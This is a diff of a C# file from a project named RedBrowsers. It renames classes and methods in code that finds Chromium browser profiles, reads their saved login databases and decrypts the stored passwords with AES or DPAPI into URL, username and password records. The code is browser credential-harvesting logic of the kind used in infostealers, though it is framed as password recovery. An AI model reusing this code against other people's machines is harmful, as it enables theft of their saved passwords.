@@ -1,23 +1,20 @@
-﻿using RedBrowsers.ChromiumEngine;
-using RedBrowsers.Classes;
+﻿using RedBrowsers.Utlis;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace RedBrowsers.ChromiumEngine
 {
-    public class GetChromium
+    public class ChromiumStorage
     {
 
         // source https://github.com/0xfd3/Chrome-Password-Recovery
         public static string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
         public static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
 
-        public static List<Account> Grab()
+        public static List<ExtractedCredentials> ReadPasswords()
         {
             Dictionary<string, string> ChromiumPaths = new Dictionary<string, string>()
             {
@@ -135,20 +132,20 @@ namespace RedBrowsers.ChromiumEngine
                 }
             };
 
-            var list = new List<Account>();
+            var list = new List<ExtractedCredentials>();
 
             foreach (var item in ChromiumPaths)
                 list.AddRange(Accounts(item.Value, item.Key));
             return list;
         }
 
-        private static List<Account> Accounts(string path, string browser, string table = "logins")
+        private static List<ExtractedCredentials> Accounts(string path, string browser, string table = "logins")
         {
 
             //Get all created profiles from browser path
             List<string> loginDataFiles = GetAllProfiles(path);
 
-            List<Account> data = new List<Account>();
+            List<ExtractedCredentials> data = new List<ExtractedCredentials>();
 
             foreach (string loginFile in loginDataFiles.ToArray())
             {
@@ -193,13 +190,13 @@ namespace RedBrowsers.ChromiumEngine
                                 password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                             }
                             else
-                                password = Decrypt(password); //Old versions using UnprotectData for decryption without any key
+                                password = DPAPIDecrypt(password); //Old versions using UnprotectData for decryption without any key
                         }
                         else
                             continue;
 
                         if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
-                            data.Add(new Account() { URL = host, UserName = username, Password = password, Application = browser });
+                            data.Add(new ExtractedCredentials() { URL = host, UserName = username, Password = password, Application = browser });
                     }
                     catch (Exception ex)
                     {
@@ -298,7 +295,7 @@ namespace RedBrowsers.ChromiumEngine
             }
         }
 
-        public static string Decrypt(string encryptedData)
+        public static string DPAPIDecrypt(string encryptedData)
         {
             if (encryptedData == null || encryptedData.Length == 0)
                 return null;
